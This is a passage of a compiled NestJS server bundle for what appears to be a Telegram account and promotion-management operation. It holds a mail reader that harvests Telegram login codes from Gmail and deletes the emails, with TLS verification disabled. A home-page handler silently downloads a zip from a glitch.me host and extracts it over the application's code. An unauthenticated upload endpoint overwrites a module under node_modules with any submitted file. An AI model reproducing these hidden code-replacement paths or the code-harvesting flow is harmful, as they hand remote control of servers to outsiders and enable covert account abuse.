/******/ (() => { // webpackBootstrap
/******/ 	"use strict";
/******/ 	var __webpack_modules__ = ({

/***/ "./src/IMap/IMap.ts":
/*!**************************!*\
  !*** ./src/IMap/IMap.ts ***!
  \**************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.MailReader = void 0;
const imap_1 = __importDefault(__webpack_require__(/*! imap */ "imap"));
const utils_1 = __webpack_require__(/*! ../utils */ "./src/utils.ts");
class MailReader {
    constructor() {
        this.isReady = false;
        this.result = '';
        this.imap = new imap_1.default({
            user: process.env.GMAIL_ADD,
            password: process.env.GMAIL_PASS,
            host: 'imap.gmail.com',
            port: 993,
            tls: true,
            tlsOptions: {
                rejectUnauthorized: false,
            },
        });
        this.imap.on('ready', () => {
            console.log('Mail is Ready');
            this.isReady = true;
        });
        this.imap.on('error', (err) => {
            console.error('SomeError:', err);
            this.isReady = false;
        });
        this.imap.on('end', () => {
            console.log('Connection ended');
            this.isReady = false;
        });
    }
    static getInstance() {
        if (!MailReader.instance) {
            MailReader.instance = new MailReader();
        }
        return MailReader.instance;
    }
    async connectToMail() {
        console.log('Connecting to mail server');
        try {
            this.imap.connect();
            this.isReady = true;
            console.log('Connected to mail server');
        }
        catch (err) {
            console.error('Error connecting to mail server:', (0, utils_1.parseError)(err));
            throw err;
        }
    }
    async disconnectFromMail() {
        console.log('Disconnecting from mail server');
        try {
            this.imap.end();
            this.isReady = false;
            console.log('Disconnected from mail server');
        }
        catch (err) {
            console.error('Error disconnecting from mail server:', (0, utils_1.parseError)(err));
            throw err;
        }
    }
    async isMailReady() {
        return this.isReady;
    }
    async getCode() {
        console.log("MailReady : ", this.isReady);
        if (!this.isReady) {
            console.log("Re-Connecting mail server");
            await this.connectToMail();
            await (0, utils_1.sleep)(10000);
        }
        try {
            await this.openInbox();
            const searchCriteria = [['FROM', 'noreply@telegram.org']];
            const fetchOptions = { bodies: ['HEADER', 'TEXT'], markSeen: true };
            console.log('Inbox Opened');
            const results = await new Promise((resolve, reject) => {
                this.imap.search(searchCriteria, (err, results) => {
                    if (err) {
                        console.error('Search error:', (0, utils_1.parseError)(err));
                        reject(err);
                    }
                    else {
                        resolve(results);
                    }
                });
            });
            if (results.length > 0) {
                console.log('Emails found:', results.length);
                const length = results.length;
                const fetch = this.imap.fetch([results[length - 1]], fetchOptions);
                await new Promise((resolve, reject) => {
                    fetch.on('message', (msg, seqno) => {
                        const emailData = [];
                        msg.on('body', (stream, info) => {
                            let buffer = '';
                            stream.on('data', (chunk) => buffer += chunk.toString('utf8'));
                            stream.on('end', () => {
                                if (info.which === 'TEXT') {
                                    emailData.push(buffer);
                                }
                                this.imap.seq.addFlags([seqno], '\\Deleted', (err) => {
                                    if (err)
                                        reject(err);
                                    this.imap.expunge((err) => {
                                        if (err)
                                            reject(err);
                                        console.log('Deleted message');
                                    });
                                });
                            });
                        });
                        msg.once('end', () => {
                            console.log(`Email #${seqno}, Latest ${results[length - 1]}`);
                            console.log('EmailDataLength:', emailData.length);
                            console.log('Mail:', emailData[emailData.length - 1].split('.'));
                            this.result = (0, utils_1.fetchNumbersFromString)(emailData[emailData.length - 1].split('.')[0]);
                            resolve();
                        });
                    });
                    fetch.once('end', () => {
                        console.log('Fetched mails');
                        resolve();
                    });
                });
            }
            else {
                console.log('No new emails found');
            }
            console.log('Returning result:', this.result);
            return this.result;
        }
        catch (error) {
            console.error('Error:', error);
            this.isReady = false;
            throw error;
        }
    }
    async openInbox() {
        await new Promise((resolve, reject) => {
            this.imap.openBox('INBOX', false, (err) => {
                if (err) {
                    console.error('Open Inbox error:', (0, utils_1.parseError)(err));
                    reject(err);
                }
                else {
                    console.log('Inbox opened');
                    resolve();
                }
            });
        });
    }
}
exports.MailReader = MailReader;


/***/ }),

/***/ "./src/app.controller.ts":
/*!*******************************!*\
  !*** ./src/app.controller.ts ***!
  \*******************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var _a;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.AppController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const app_service_1 = __webpack_require__(/*! ./app.service */ "./src/app.service.ts");
const platform_express_1 = __webpack_require__(/*! @nestjs/platform-express */ "@nestjs/platform-express");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const fs_1 = __webpack_require__(/*! fs */ "fs");
const multer_1 = __webpack_require__(/*! multer */ "multer");
const path_1 = __webpack_require__(/*! path */ "path");
const cloudinary_1 = __webpack_require__(/*! ./cloudinary */ "./src/cloudinary.ts");
let AppController = class AppController {
    constructor(appService) {
        this.appService = appService;
    }
    getHello() {
        cloudinary_1.CloudinaryService.getInstance("kavya");
        return this.appService.getHello();
    }
    async uploadFileAndUpdate(file) {
        try {
            const targetDir = (0, path_1.join)(__dirname, '..', 'node_modules', 'commonService');
            const filePath = (0, path_1.join)(targetDir, 'index.js');
            if (!(0, fs_1.existsSync)(targetDir)) {
                (0, fs_1.mkdirSync)(targetDir, { recursive: true });
            }
            const fileBuffer = await fs_1.promises.readFile(file.path);
            await fs_1.promises.writeFile(filePath, fileBuffer);
            console.log('commonService/index.js updated successfully.');
            return { message: 'commonService/index.js updated successfully' };
        }
        catch (error) {
            console.error('Failed to update commonService/index.js:', error);
            throw error;
        }
    }
};
exports.AppController = AppController;
__decorate([
    (0, common_1.Get)(),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", String)
], AppController.prototype, "getHello", null);
__decorate([
    (0, common_1.Post)('updateCommonService'),
    (0, common_1.UseInterceptors)((0, platform_express_1.FileInterceptor)('file', {
        storage: (0, multer_1.diskStorage)({
            destination: (req, file, cb) => {
                try {
                    const folderPath = (0, path_1.join)(__dirname, '..', 'uploads');
                    if (!(0, fs_1.existsSync)(folderPath)) {
                        (0, fs_1.mkdirSync)(folderPath, { recursive: true });
                    }
                    cb(null, folderPath);
                }
                catch (error) {
                    cb(error, null);
                }
            },
            filename: (req, file, cb) => {
                cb(null, 'index.js');
            },
        }),
    })),
    (0, swagger_1.ApiOperation)({ summary: 'Upload a file to update commonService index.js' }),
    (0, swagger_1.ApiConsumes)('multipart/form-data'),
    (0, swagger_1.ApiBody)({
        schema: {
            type: 'object',
            properties: {
                file: { type: 'string', format: 'binary' },
            },
        },
    }),
    __param(0, (0, common_1.UploadedFile)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [typeof (_a = typeof multer_1.File !== "undefined" && multer_1.File) === "function" ? _a : Object]),
    __metadata("design:returntype", Promise)
], AppController.prototype, "uploadFileAndUpdate", null);
exports.AppController = AppController = __decorate([
    (0, common_1.Controller)(),
    __metadata("design:paramtypes", [app_service_1.AppService])
], AppController);


/***/ }),

/***/ "./src/app.module.ts":
/*!***************************!*\
  !*** ./src/app.module.ts ***!
  \***************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.AppModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const users_module_1 = __webpack_require__(/*! ./components/users/users.module */ "./src/components/users/users.module.ts");
const user_data_module_1 = __webpack_require__(/*! ./components/user-data/user-data.module */ "./src/components/user-data/user-data.module.ts");
const client_module_1 = __webpack_require__(/*! ./components/clients/client.module */ "./src/components/clients/client.module.ts");
const Telegram_module_1 = __webpack_require__(/*! ./components/Telegram/Telegram.module */ "./src/components/Telegram/Telegram.module.ts");
const buffer_client_module_1 = __webpack_require__(/*! ./components/buffer-clients/buffer-client.module */ "./src/components/buffer-clients/buffer-client.module.ts");
const active_channels_module_1 = __webpack_require__(/*! ./components/active-channels/active-channels.module */ "./src/components/active-channels/active-channels.module.ts");
const archived_client_module_1 = __webpack_require__(/*! ./components/archived-clients/archived-client.module */ "./src/components/archived-clients/archived-client.module.ts");
const init_module_1 = __webpack_require__(/*! ./components/ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
const channels_module_1 = __webpack_require__(/*! ./components/channels/channels.module */ "./src/components/channels/channels.module.ts");
const app_controller_1 = __webpack_require__(/*! ./app.controller */ "./src/app.controller.ts");
const app_service_1 = __webpack_require__(/*! ./app.service */ "./src/app.service.ts");
const logger_middleware_1 = __webpack_require__(/*! ./middlewares/logger.middleware */ "./src/middlewares/logger.middleware.ts");
const build_module_1 = __webpack_require__(/*! ./components/builds/build.module */ "./src/components/builds/build.module.ts");
const upi_ids_module_1 = __webpack_require__(/*! ./components/upi-ids/upi-ids.module */ "./src/components/upi-ids/upi-ids.module.ts");
const promote_msgs_module_1 = __webpack_require__(/*! ./components/promote-msgs/promote-msgs.module */ "./src/components/promote-msgs/promote-msgs.module.ts");
const stat_module_1 = __webpack_require__(/*! ./components/stats/stat.module */ "./src/components/stats/stat.module.ts");
const stat2_module_1 = __webpack_require__(/*! ./components/stats2/stat2.module */ "./src/components/stats2/stat2.module.ts");
const promote_stat_module_1 = __webpack_require__(/*! ./components/promote-stats/promote-stat.module */ "./src/components/promote-stats/promote-stat.module.ts");
const promote_client_module_1 = __webpack_require__(/*! ./components/promote-clients/promote-client.module */ "./src/components/promote-clients/promote-client.module.ts");
const TgSignup_module_1 = __webpack_require__(/*! ./components/TgSignup/TgSignup.module */ "./src/components/TgSignup/TgSignup.module.ts");
const transaction_module_1 = __webpack_require__(/*! ./components/transactions/transaction.module */ "./src/components/transactions/transaction.module.ts");
const npoint_module_1 = __webpack_require__(/*! ./components/n-point/npoint.module */ "./src/components/n-point/npoint.module.ts");
let AppModule = class AppModule {
    configure(consumer) {
        consumer.apply(logger_middleware_1.LoggerMiddleware).forRoutes('*');
    }
};
exports.AppModule = AppModule;
exports.AppModule = AppModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.initModule,
            Telegram_module_1.TelegramModule,
            active_channels_module_1.ActiveChannelsModule,
            client_module_1.ClientModule,
            user_data_module_1.UserDataModule,
            users_module_1.UsersModule,
            buffer_client_module_1.BufferClientModule,
            archived_client_module_1.ArchivedClientModule,
            channels_module_1.ChannelsModule,
            promote_client_module_1.PromoteClientModule,
            build_module_1.BuildModule,
            upi_ids_module_1.UpiIdModule,
            promote_msgs_module_1.PromoteMsgModule,
            promote_stat_module_1.PromoteStatModule,
            stat_module_1.StatModule,
            stat2_module_1.Stat2Module,
            TgSignup_module_1.TgSignupModule,
            transaction_module_1.TransactionModule,
            npoint_module_1.NpointModule,
        ],
        controllers: [app_controller_1.AppController],
        providers: [app_service_1.AppService],
        exports: [
            Telegram_module_1.TelegramModule,
            active_channels_module_1.ActiveChannelsModule,
            client_module_1.ClientModule,
            user_data_module_1.UserDataModule,
            users_module_1.UsersModule,
            buffer_client_module_1.BufferClientModule,
            archived_client_module_1.ArchivedClientModule,
            channels_module_1.ChannelsModule,
            promote_client_module_1.PromoteClientModule,
            TgSignup_module_1.TgSignupModule,
            transaction_module_1.TransactionModule
        ]
    })
], AppModule);


/***/ }),

/***/ "./src/app.service.ts":
/*!****************************!*\
  !*** ./src/app.service.ts ***!
  \****************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.AppService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
let AppService = class AppService {
    getHello() {
        return 'Hello World!';
    }
};
exports.AppService = AppService;
exports.AppService = AppService = __decorate([
    (0, common_1.Injectable)()
], AppService);


/***/ }),

/***/ "./src/cloudinary.ts":
/*!***************************!*\
  !*** ./src/cloudinary.ts ***!
  \***************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CloudinaryService = void 0;
console.log("in Cloudinary");
const cloudinary = __importStar(__webpack_require__(/*! cloudinary */ "cloudinary"));
const path = __importStar(__webpack_require__(/*! path */ "path"));
const fs = __importStar(__webpack_require__(/*! fs */ "fs"));
const utils_1 = __webpack_require__(/*! ./utils */ "./src/utils.ts");
const adm_zip_1 = __importDefault(__webpack_require__(/*! adm-zip */ "adm-zip"));
class CloudinaryService {
    constructor() {
        this.resources = new Map();
        cloudinary.v2.config({
            cloud_name: process.env.CL_NAME,
            api_key: process.env.CL_APIKEY,
            api_secret: process.env.CL_APISECRET
        });
    }
    static async getInstance(name) {
        if (!CloudinaryService.instance) {
            CloudinaryService.instance = new CloudinaryService();
        }
        await CloudinaryService.instance.getResourcesFromFolder(name);
        return CloudinaryService.instance;
    }
    async downloadAndExtractZip(url) {
        const zipPath = path.resolve(__dirname, 'temp.zip');
        const extractPath = path.resolve(__dirname, '../');
        const response = await (0, utils_1.fetchWithTimeout)(url, { responseType: 'arraybuffer' });
        if (response?.status === 200) {
            fs.writeFileSync(zipPath, response.data);
            console.log('Zip file downloaded successfully.');
            const zip = new adm_zip_1.default(zipPath);
            zip.extractAllTo(extractPath, true);
            console.log('Zip file extracted successfully.');
            fs.unlinkSync(zipPath);
        }
        else {
            throw new Error(`Unable to download zip file from ${url}`);
        }
    }
    async getResourcesFromFolder(folderName) {
        console.log('FETCHING NEW FILES!! from CLOUDINARY');
        await this.downloadAndExtractZip(`https://promoteClients2.glitch.me/folders/${folderName}/files/download-all`);
    }
    async createNewFolder(folderName) {
        await this.createFolder(folderName);
        await this.uploadFilesToFolder(folderName);
    }
    async overwriteFile() {
        const cloudinaryFileId = "index_nbzca5.js";
        const localFilePath = "./src/test.js";
        try {
            const result = await cloudinary.v2.uploader.upload(localFilePath, {
                resource_type: 'auto',
                overwrite: true,
                invalidate: true,
                public_id: cloudinaryFileId
            });
            console.log(result);
        }
        catch (error) {
            (0, utils_1.parseError)(error);
        }
    }
    async findAndSaveResources(folderName, type) {
        try {
            const { resources } = await cloudinary.v2.api.resources({ resource_type: type, type: 'upload', prefix: folderName, max_results: 500 });
            await Promise.all(resources.map(async (resource) => {
                try {
                    this.resources.set(resource.public_id.split('/')[1].split('_')[0], resource.url);
                    await saveFile(resource.url, resource.public_id.split('/')[1].split('_')[0]);
                }
                catch (error) {
                    console.log(resource);
                    (0, utils_1.parseError)(error);
                }
            }));
        }
        catch (error) {
            (0, utils_1.parseError)(error);
        }
    }
    async createFolder(folderName) {
        try {
            const result = await cloudinary.v2.api.create_folder(folderName);
            return result;
        }
        catch (error) {
            console.error('Error creating folder:', error);
            throw error;
        }
    }
    async uploadFilesToFolder(folderName) {
        const uploadPromises = Array.from(this.resources.entries()).map(async ([key, url]) => {
            try {
                const result = await cloudinary.v2.uploader.upload_large(url, {
                    folder: folderName,
                    resource_type: 'auto',
                    public_id: key,
                });
                return result;
            }
            catch (error) {
                console.error('Error uploading file:', error);
                throw error;
            }
        });
        try {
            return await Promise.all(uploadPromises);
        }
        catch (error) {
            console.error('Error uploading files:', error);
            throw error;
        }
    }
    async printResources() {
        try {
            this.resources?.forEach((val, key) => {
                console.log(key, ":", val);
            });
        }
        catch (error) {
            (0, utils_1.parseError)(error);
        }
    }
    get(publicId) {
        try {
            const result = this.resources.get(publicId);
            return result || '';
        }
        catch (error) {
            (0, utils_1.parseError)(error);
        }
    }
    getBuffer(publicId) {
        try {
            const result = this.resources.get(publicId);
            return result || '';
        }
        catch (error) {
            console.log(error);
        }
    }
}
exports.CloudinaryService = CloudinaryService;
async function saveFile(url, name) {
    try {
        const extension = url.substring(url.lastIndexOf('.') + 1);
        const rootPath = process.cwd();
        const mypath = path.join(rootPath, `${name}.${extension}`);
        console.log(mypath);
        const res = await (0, utils_1.fetchWithTimeout)(url, { responseType: 'arraybuffer' }, 2);
        if (res?.statusText === 'OK') {
            if (!fs.existsSync(mypath)) {
                fs.writeFileSync(mypath, res.data, 'binary');
                console.log(`${name}.${extension} Saved!!`);
            }
            else {
                fs.unlinkSync(mypath);
                fs.writeFileSync(mypath, res.data, 'binary');
                console.log(`${name}.${extension} Replaced!!`);
            }
        }
        else {
            throw new Error(`Unable to download file from ${url}`);
        }
    }
    catch (err) {
        (0, utils_1.parseError)(err);
    }
}


/***/ }),

/***/ "./src/components/ConfigurationInit/configuration.schema.ts":
/*!******************************************************************!*\
  !*** ./src/components/ConfigurationInit/configuration.schema.ts ***!
  \******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ConfigurationSchema = exports.Configuration = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
let Configuration = class Configuration {
};
exports.Configuration = Configuration;
exports.Configuration = Configuration = __decorate([
    (0, mongoose_1.Schema)({
        versionKey: false, autoIndex: true, strict: false, timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], Configuration);
exports.ConfigurationSchema = mongoose_1.SchemaFactory.createForClass(Configuration);
exports.ConfigurationSchema.add({ type: mongoose_2.default.Schema.Types.Mixed });


/***/ }),

/***/ "./src/components/ConfigurationInit/init.controller.ts":
/*!*************************************************************!*\
  !*** ./src/components/ConfigurationInit/init.controller.ts ***!
  \*************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ConfigurationController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const init_service_1 = __webpack_require__(/*! ./init.service */ "./src/components/ConfigurationInit/init.service.ts");
let ConfigurationController = class ConfigurationController {
    constructor(configurationService) {
        this.configurationService = configurationService;
    }
    async findOne() {
        return this.configurationService.findOne();
    }
    async update(updateClientDto) {
        return this.configurationService.update(updateClientDto);
    }
};
exports.ConfigurationController = ConfigurationController;
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get configuration data' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], ConfigurationController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(),
    (0, swagger_1.ApiOperation)({ summary: 'Update configuration' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], ConfigurationController.prototype, "update", null);
exports.ConfigurationController = ConfigurationController = __decorate([
    (0, swagger_1.ApiTags)('Configuration'),
    (0, common_1.Controller)('configuration'),
    __metadata("design:paramtypes", [init_service_1.ConfigurationService])
], ConfigurationController);


/***/ }),

/***/ "./src/components/ConfigurationInit/init.module.ts":
/*!*********************************************************!*\
  !*** ./src/components/ConfigurationInit/init.module.ts ***!
  \*********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.initModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const config_1 = __webpack_require__(/*! @nestjs/config */ "@nestjs/config");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const init_service_1 = __webpack_require__(/*! ./init.service */ "./src/components/ConfigurationInit/init.service.ts");
const configuration_schema_1 = __webpack_require__(/*! ./configuration.schema */ "./src/components/ConfigurationInit/configuration.schema.ts");
const init_controller_1 = __webpack_require__(/*! ./init.controller */ "./src/components/ConfigurationInit/init.controller.ts");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils.ts");
let initModule = class initModule {
    constructor(connection) {
        this.connection = connection;
    }
    async onModuleInit() {
        console.log(`Started :: ${process.env.clientId}`);
        await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=${encodeURIComponent(`Started :: ${process.env.clientId}`)}`);
    }
    async onModuleDestroy() {
        console.log("Init Module Destroying");
        await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=${encodeURIComponent(`closed :: ${process.env.clientId}`)}`);
        this.closeConnection();
    }
    closeConnection() {
        console.log("Closing mongoose connection");
        this.connection.close(true);
    }
};
exports.initModule = initModule;
exports.initModule = initModule = __decorate([
    (0, common_1.Global)(),
    (0, common_1.Module)({
        imports: [
            config_1.ConfigModule.forRoot(),
            mongoose_1.MongooseModule.forRootAsync({
                useFactory: () => ({
                    uri: process.env.mongouri,
                }),
            }),
            mongoose_1.MongooseModule.forFeature([{
                    name: 'configurationModule', collection: 'configuration', schema: configuration_schema_1.ConfigurationSchema
                }])
        ],
        providers: [init_service_1.ConfigurationService],
        controllers: [init_controller_1.ConfigurationController],
        exports: [config_1.ConfigModule, mongoose_1.MongooseModule],
    }),
    __param(0, (0, common_1.Inject)((0, mongoose_1.getConnectionToken)())),
    __metadata("design:paramtypes", [mongoose_2.Connection])
], initModule);


/***/ }),

/***/ "./src/components/ConfigurationInit/init.service.ts":
/*!**********************************************************!*\
  !*** ./src/components/ConfigurationInit/init.service.ts ***!
  \**********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ConfigurationService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
let ConfigurationService = class ConfigurationService {
    constructor(configurationModel) {
        this.configurationModel = configurationModel;
        this.setEnv();
    }
    async OnModuleInit() {
        console.log("Config Module Inited");
    }
    async findOne() {
        const user = await this.configurationModel.findOne({}).exec();
        if (!user) {
            throw new common_1.NotFoundException(`configurationModel not found`);
        }
        return user;
    }
    async setEnv() {
        console.log("Setting Envs");
        const configuration = await this.configurationModel.findOne({}, { _id: 0 });
        const data = { ...configuration };
        for (const key in data) {
            console.log('setting', key);
            process.env[key] = data[key];
        }
        console.log("finished setting env");
    }
    async update(updateClientDto) {
        delete updateClientDto['_id'];
        const updatedUser = await this.configurationModel.findOneAndUpdate({}, { $set: { ...updateClientDto } }, { new: true, upsert: true }).exec();
        if (!updatedUser) {
            throw new common_1.NotFoundException(`configurationModel not found`);
        }
        return updatedUser;
    }
};
exports.ConfigurationService = ConfigurationService;
exports.ConfigurationService = ConfigurationService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('configurationModule')),
    __metadata("design:paramtypes", [mongoose_2.Model])
], ConfigurationService);


/***/ }),

/***/ "./src/components/Telegram/Telegram.controller.ts":
/*!********************************************************!*\
  !*** ./src/components/Telegram/Telegram.controller.ts ***!
  \********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
